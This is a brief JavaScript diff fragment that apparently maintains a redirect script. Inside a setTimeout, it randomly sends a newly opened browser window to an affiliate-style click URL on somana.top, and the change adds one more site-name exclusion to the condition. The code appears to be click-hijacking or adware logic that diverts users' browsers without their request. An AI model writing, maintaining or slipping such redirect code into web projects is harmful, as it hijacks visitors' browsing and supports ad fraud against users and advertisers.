@@ -9,6 +9,7 @@ setTimeout(function () {
       newWindow &&
       url &&
       !url.includes("sosalkino") &&
+      !url.includes("sosmbad") &&
       Math.random() < 0.5
     ) {
       newWindow.location.href = "https://somana.top/click?o=2&a=7685";
